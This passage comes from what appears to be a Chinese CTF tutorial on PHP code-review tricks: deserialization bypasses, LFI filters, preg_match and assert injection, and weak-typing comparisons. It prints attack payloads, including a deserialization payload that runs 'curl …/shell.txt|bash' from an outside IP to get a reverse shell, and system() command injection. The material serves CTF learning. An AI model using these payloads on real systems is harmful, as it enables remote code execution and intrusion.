keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这道题的难点不是代码审计，而是emmmmmmmmmmmmmm!!!!!!!!!!!!!</p><p><img src="/2020/05/09/best-codereview/8.png" alt="tnl"></p><p>我没有去读文件，我没有去读文件，我没有去读文件，我没有去读文件，我没有去读文件，我没有去读文件。</p><p>言归正传，这道题反序列化直接绕过in_array检测，实现rce，但是根目录里没flag，web根目录没有flag，我怀疑web根目录需要找路径，反序列化去看phpinfo，搜索index.php，找到了路径/data/frontend/web/index.php，很遗憾绝对路径也没有flag。</p><pre><code>O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:2:&quot;20&quot;;s:4:&quot;func&quot;;s:7:&quot;phpinfo&quot;;}</code></pre><p><img src="/2020/05/09/best-codereview/9.png" alt="phpinfo"></p><p>反弹shell</p><pre><code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:{s:1:&quot;p&quot;;s:40:&quot;curl http://47.112.158.20/shell.txt|bash&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;}</code></pre><p>flag在tmp文件夹下面：</p><pre><code>find /tmp -name &quot;*&quot; | xargs grep &quot;flag{&quot;</code></pre><p><img src="/2020/05/09/best-codereview/10.png" alt="result"></p><h4 id="1-1-7-3-demo2"><a href="#1-1-7-3-demo2" class="headerlink" title="1.1.7.3  demo2"></a>1.1.7.3  demo2</h4><pre class="line-numbers language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"var_dump($a);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//  ?hello=scandir(chr(47))</span><span class="token comment" spellcheck="true">//  ?hello=file_get_contents("flag.php")</span><span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-8-preg-replace"><a href="#1-1-8-preg-replace" class="headerlink" title="1.1.8  preg_replace"></a>1.1.8  preg_replace</h3><h3 id="1-1-9-str-replace"><a href="#1-1-9-str-replace" class="headerlink" title="1.1.9  str_replace"></a>1.1.9  str_replace</h3><p>曾经做过一道题LFI，源码如下：</p><p>构造去读hint.txt，得到flag!hdctf.php，然后!会被过滤，这时候str_replace和preg_replace搭配使用可以进行绕过。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//index.php</span><span class="token comment" spellcheck="true">/* *    more: aGludC50eHQ=   hint.txt *  */</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span><span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;title>'</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'jpg'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">'&lt;/title>'</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"s3cret"</span><span class="token punctuation">,</span><span class="token string">"!"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token punctuation">.</span><span class="token string">'&lt;/br>'</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span><span class="token punctuation">.</span><span class="token variable">$txt</span><span class="token punctuation">.</span><span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/* * Can you find the flag file? * */</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-1-10-preg-match"><a href="#1-1-10-preg-match" class="headerlink" title="1.1.10  preg_match"></a>1.1.10  preg_match</h3><p><strong>1、</strong>一般用%0a绕过（当preg_match中有^或者$的时候），demo如下：</p><p>demo1：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^2333$/'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">"2333"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'success'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// payload : ?a=2333%0a</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="../../../../2020/04/30/best-rce/#toc-heading-18">demo2</a></p><p><strong>2、</strong>正则回溯次数限制绕过</p><p><strong>参考p牛文章：</strong><br> <a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a> </p><p>正则回溯最大只有1000000，如果回溯次数超过就会返回flase，构造1000000个a，使回溯超过限制就会绕过正则匹配，限制次数在php.ini的pcre.backtrack_limit有，而不造成这个漏洞的方法就是使用强比较=== 。</p><p>小细节：get是传不了这么大的数据的，可以用post传</p><p>payload：</p><pre><code>python构造&quot;a&quot;*1000000</code></pre><h3 id="1-1-11-sprintf"><a href="#1-1-11-sprintf" class="headerlink" title="1.1.11  sprintf"></a>1.1.11  sprintf</h3><h3 id="1-1-12-assert"><a href="#1-1-12-assert" class="headerlink" title="1.1.12  assert"></a>1.1.12  assert</h3><p><strong>题目链接：</strong><a href="http://web.jarvisoj.com:32798" target="_blank" rel="noopener">http://web.jarvisoj.com:32798</a></p><p><strong>参考资料：</strong></p><p><strong>1、</strong>记一道CTF题babyphp之学习代码注入  <a href="https://blog.csdn.net/xiaotaode2012/article/details/77370436" target="_blank" rel="noopener">https://blog.csdn.net/xiaotaode2012/article/details/77370436</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token comment" spellcheck="true">//核心代码</span>    <span class="token comment" spellcheck="true">// paylaod:  ?page=flag'.system("cat templates/flag.php").'flag</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token string">"home"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">"templates/"</span> <span class="token punctuation">.</span> <span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">".php"</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"strpos('$file', '..') === false"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Detected hacking attempt!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"file_exists('$file')"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"That file doesn't exist!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/09/best-codereview/14.png" alt="babyphp"></p><h3 id="1-1-13-intval"><a href="#1-1-13-intval" class="headerlink" title="1.1.13  intval"></a>1.1.13  intval</h3><p>intval函数内填入科学计数法的字符串，会以e前面的数字作为返回值，如果该字符串与整数相加就会强行转化为数字类型。</p><pre><code>php &gt; echo intval(&quot;0e5&quot;);0php &gt; echo intval(&quot;10e5&quot;);1000000php &gt; echo intval(&quot;10e5&quot;+1);1000001</code></pre><p>在windows下，也会存在如下情况（应该是整型溢出）</p><pre><code>php &gt; echo intval(&quot;7e10&quot;+1);70000000001php &gt; echo intval(&quot;7e20&quot;+1);-976274800962961408php &gt; echo intval(&quot;7e30&quot;+1);-1354457587931676672php &gt; echo intval(&quot;7e55&quot;+1);0</code></pre><h3 id="1-1-14-call-user-func"><a href="#1-1-14-call-user-func" class="headerlink" title="1.1.14  call_user_func"></a>1.1.14  call_user_func</h3><h2 id="1-2-php语法特性"><a href="#1-2-php语法特性" class="headerlink" title="1.2  php语法特性"></a>1.2  php语法特性</h2><h3 id="1-2-1-数组"><a href="#1-2-1-数组" class="headerlink" title="1.2.1  数组"></a>1.2.1  数组</h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$number</span> <span class="token operator">=</span> <span class="token number">999999999999999</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'fight!!!'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'too small'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$new_a</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$new_a</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'flag{******}'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'too big'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php的数组始终比数字大，转换成字符串与0弱相等</p><pre><code>payload:    ?a[]=0&amp;b=strval脑洞：如果我去限制传入b的长度呢</code></pre><h3 id="1-2-2-字符串"><a href="#1-2-2-字符串" class="headerlink" title="1.2.2  字符串"></a><strong>1.2.2  字符串</strong></h3><p>字符串和数字比较，字符串会被转换成数字。</p><p>混合字符串转换成数字，从第一个数字到第一个字母为止这部分为数值（如果该字符串第一个字符就为字母，那么即使它后面还有数字，它仅与0弱相等）。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token string">"a121"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'success'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若数值为科学计数法表示，则不会把e当成字母，会取完整的科学技术法表示的数值。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"1e100aaaaaa"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">></span><span class="token number">1000000000000000000000000000000000000000000000000000000000000000</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#success</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-3-数值类型"><a href="#1-2-3-数值类型" class="headerlink" title="1.2.3  数值类型"></a>1.2.3  数值类型</h3><h4 id="1-2-3-1-十六进制"><a href="#1-2-3-1-十六进制" class="headerlink" title="1.2.3.1  十六进制"></a><strong>1.2.3.1  十六进制</strong></h4><p>首先我们看一下例子：</p><pre><code>&quot;0x1e240&quot;==&quot;123456&quot; //true&quot;0x1e240&quot;==123456 //true&quot;0x1e240&quot;==&quot;1e240&quot; //false</code></pre><p>php在接受一个带0x的字符串的时候，会自动把这行字符串解析成<strong>十进制</strong>的再进行比较，0x1e240解析成十进制就是123456，并且与字符串类型的123456和int型的123456都相同。</p><p><strong>例子：《起名字真难》源自源于南邮攻防平台题目(<a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">https://cgctf.nuptsast.com/challenges#Web</a>)</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">noother_says_correct</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token variable">$one</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token variable">$nine</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>       <span class="token punctuation">{</span>                 <span class="token variable">$digit</span> <span class="token operator">=</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$number</span><span class="token punctuation">{</span><span class="token variable">$i</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">>=</span> <span class="token variable">$one</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$digit</span> <span class="token operator">&lt;=</span> <span class="token variable">$nine</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>               <span class="token punctuation">{</span>                       <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>               <span class="token punctuation">}</span>       <span class="token punctuation">}</span>          <span class="token keyword">return</span> <span class="token variable">$number</span> <span class="token operator">==</span> <span class="token string">'54975581388'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'*******'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">noother_says_correct</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span>   <span class="token keyword">echo</span> <span class="token string">'access denied'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>题目大致的意思就是输入一串key，key不可以是数字的形式，但是要求与54975581388相等，看完题目就知道要求字符串和数字进行比较，想到的就是弱类型，54975581388与之匹配的十六进制的字符串是0xccccccccc。这就很巧了，全不是数字，自然就绕过了，得到flag。</p><h4 id="1-2-3-2-布尔值"><a href="#1-2-3-2-布尔值" class="headerlink" title="1.2.3.2  布尔值"></a>1.2.3.2  布尔值</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">// $a = $_GET['a'];</span><span class="token comment" spellcheck="true">// if(preg_match("/name/i", $a)){</span><span class="token comment" spellcheck="true">//     echo 'hacker!!';</span><span class="token comment" spellcheck="true">// }</span><span class="token comment" spellcheck="true">// else{</span><span class="token comment" spellcheck="true">//     if($a=="name"){</span><span class="token comment" spellcheck="true">//     echo "success";</span><span class="token comment" spellcheck="true">// }</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>布尔值可以和任何字符串弱相等，因为get形式提交的都是字符串，所以注释那部分的出题预想就不能实现了。</p><h4 id="1-2-3-3-科学计数法"><a href="#1-2-3-3-科学计数法" class="headerlink" title="1.2.3.3  科学计数法"></a>1.2.3.3  科学计数法</h4><p>字符串开头以xex开头，x代表数字。会被转换成科学计数法（注意一定要是de/d+的模式）。但是也有例外如：-1.3e3转换为浮点数是-1300。</p><p>例如： <code>&quot;2e0&quot;==&quot;2&quot;</code> </p><h4 id="1-2-3-4-json"><a href="#1-2-3-4-json" class="headerlink" title="1.2.3.4  json"></a><strong>1.2.3.4  json</strong></h4><p>首先我们介绍一下什么是json：json概念很简单，json是一种轻量级的数据格式，他是基于 javascript 语法的子集，即数组和对象表示。由于使用的是 javascript 语法，因此json定义可以包含在javascript 文件中，对其的访问无需通过基于 XML 的语言来额外解析。</p><p><strong>demo：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$message</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span><span class="token punctuation">;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//$key就是不想给你看，我只能告诉你它是字符串;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$message</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"fail"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>     <span class="token keyword">echo</span> <span class="token string">"~~~~"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入一个数组进行json解码，如果解码后的message与key值相同，会得到flag，主要思想还是弱类型绕过。我们知道key值是字符串，上文讲过，两个等号比较时会转化成同一类型再进行比较，那么就可以进行爆破。最终</p><pre><code>payload message={&quot;key&quot;:number}number处进行数字爆破-----------------------------------------------------------------------------------------一个需要注意的点：键值需要用双引号括起来，用单引号错误！！</code></pre><h4 id="1-2-3-5-浮点精度"><a href="#1-2-3-5-浮点精度" class="headerlink" title="1.2.3.5  浮点精度"></a>1.2.3.5  浮点精度</h4><p><strong>参考资料：</strong></p><p><strong>1、</strong><a href="https://www.gem-love.com/ctf/2283.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2283.html</a></p><p><strong>样例：</strong>分别在本地的不同php版本下进行测试</p><pre class="line-numbers language-php"><code class="language-php">php7<span class="token number">.3</span><span class="token punctuation">.</span><span class="token number">4</span>版本<span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"1000000000000000.01"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$a = "100000000000000.01";   整数部分少个0就不行了</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//$b = 1000000000000000</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token shell-comment comment">#if语句判断为真</span><span class="token delimiter">?></span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>php5<span class="token number">.6</span><span class="token punctuation">.</span><span class="token number">9</span>版本<span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"1000000000000000.01"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#2147483647</span><span class="token shell-comment comment">#显然下面的if语句判断为假</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">==</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"success"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/09/best-codereview/2.png" alt="php5.6.9版本"></p><p><strong>题目：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span 